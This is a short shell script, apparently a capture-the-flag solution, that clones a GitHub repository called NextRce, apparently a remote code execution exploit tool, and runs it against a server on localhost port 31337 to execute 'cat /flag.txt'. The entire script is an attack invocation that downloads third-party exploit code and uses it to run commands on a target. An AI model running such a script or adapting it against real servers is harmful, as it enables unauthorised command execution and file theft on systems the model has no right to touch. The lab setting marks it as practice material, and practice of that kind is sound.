#!/bin/sh

git clone https://github.com/ynsmroztas/NextRce.git
cd NextRce
python3 nextrce.py -u "http://localhost:31337" -c "cat /flag.txt"
